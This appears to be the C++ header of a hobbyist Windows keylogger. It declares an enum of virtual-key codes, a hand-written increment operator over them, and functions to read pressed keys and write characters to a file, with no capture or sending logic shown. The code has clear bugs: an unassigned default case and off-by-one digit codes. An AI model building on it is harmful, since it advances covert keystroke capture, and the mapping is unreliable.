#include <vector>
#ifndef KEYLOG_H
#define KEYLOG_H

// Definitely Windows specific
enum vcodes {VK_BACK = 0x08, VK_TAB, VK_CLEAR = 0x0C, VK_RETURN, VK_SHIFT = 0x10, VK_CONTROL,
    VK_MENU, VK_PAUSE, VK_CAPITAL, VK_ESCAPE = 0x1B, VK_SPACE = 0x20, VK_PRIOR, VK_NEXT, VK_END,
    VK_HOME, VK_LEFT, VK_UP, VK_RIGHT, VK_DOWN, VK_SELECT, VK_PRINT, VK_EXECUTE, VK_SNAPSHOT,
    VK_INSERT, VK_DELETE, VK_HELP, VK_1, VK_2, VK_3, VK_4, VK_5, VK_6, VK_7, VK_8, VK_9,
    VK_A = 0x41, VK_B, VK_C, VK_D, VK_E, VK_F, VK_G, VK_H, VK_I, VK_J, VK_K, VK_L, VK_M, VK_N,
    VK_O, VK_P, VK_Q, VK_R, VK_S, VK_T, VK_U, VK_V, VK_W, VK_X, VK_Y, VK_Z, VK_LWIN, VK_RWIN,
    VK_APPS, VK_SLEEP = 0x5F, VK_NUMPAD0, VK_NUMPAD1, VK_NUMPAD2, VK_NUMPAD3, VK_NUMPAD4,
    VK_NUMPAD5, VK_NUMPAD6, VK_NUMPAD7, VK_NUMPAD8, VK_NUMPAD9, VK_MULTIPLY, VK_ADD,
    VK_SEPARATOR, VK_SUBTRACT, VK_DECIMAL, VK_DIVIDE, VK_OEM_1 = 0xBB /*'.'*/,
    VK_OEM_PLUS /*'+'*/, VK_OEM_COMMA /*','*/, VK_OEM_MINUS /*'-'*/, VK_OEM_PERIOD /*'.'*/,
    VK_OEM_2 /*'/?'*/, VK_OEM_3 /*'`~'*/, VK_OEM_4 = 0xDB /*'[{'*/, VK_OEM_5 /*'\|'*/,
    VK_OEM_6 /*']}'*/, VK_OEM_7 /*''"'*/, VK_OEM_8 /*'IDK'*/, VK_OEM_CLEAR = 0xFE, END};

vcodes& operator++(vcodes& e) {
    switch(e) {
        case VK_TAB:
        e = vcodes(0x0C);
        break;
        case VK_RETURN:
        e = vcodes(0x10);
        break;
        case VK_CAPITAL:
        e = vcodes(0x1B);
        break;
        case VK_ESCAPE:
        e = vcodes(0x20);
        break;
        case VK_9:
        e = vcodes(0x41);
        break;
        case VK_APPS:
        e = vcodes(0x5F);
        break;
        case VK_DIVIDE:
        e = vcodes(0xBB);
        break;
        case VK_OEM_3:
        e = vcodes(0xDB);
        break;
        case VK_OEM_8:
        e = vcodes(0xFE);
        break;
        case END:
        throw out_of_range("vcodes operator++");
        default:
        vcodes(static_cast<underlying_type<vcodes>::type>(e) + 1);
    }
    return e;
} // operator++ (in header for reassurance it works)


// Maybe Windows specific

struct key {
    int vcode;
    bool prev;
};

std::vector<key> getPressedKeyboardState();

// Generic
void writeToFile(char);
#endif